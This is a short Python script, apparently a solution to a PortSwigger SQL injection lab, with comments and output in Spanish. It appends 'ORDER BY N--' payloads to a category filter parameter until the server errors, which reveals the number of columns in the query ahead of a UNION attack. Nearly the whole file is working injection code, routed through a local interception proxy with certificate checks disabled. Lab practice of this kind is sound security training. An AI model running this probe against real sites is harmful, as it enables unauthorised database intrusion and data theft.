#!/usr/bin/python3

#by Davinci
#Lab3: SQL injection UNION attack, determining the number of columns returned by the query
#https://portswigger.net/

from pwn import *
import sys
import requests
import signal, time
from bs4 import BeautifulSoup
import urllib3

#HttpsNoWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#ctrl_fuction

def ctrl_Fuction(sig, frames):
	print("[!]Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_Fuction)

#Proxies

proxies = { 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

def sql_UnionExploit(url):
	uri = "filter?category="
	bar = log.progress("[!] Iniciando Injection")
	bar.status("[!] Determinando el numero de columnas")

	for i in range(1,50):
		payload = "'+order+by+%s--" %i
		r = requests.get(url + uri + payload, verify=False, proxies=proxies)
		resp = r.text
		if "Internal Server Error" in resp:
			return i - 1
		else:
			i += 1
	return False

#functionhelPanel
def helPanel():
	print("[!]Usage %s <url>" %sys.argv[0])
	print("[!] Example python3 %s www.mipagina.com " %sys.argv[0])


if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		helPanel()

	num_column= sql_UnionExploit(url)
	
	if num_column:
		print("[!] El numero de columna es: %s " %num_column)
	else:
		print("[!] La injection no fue exitosa")
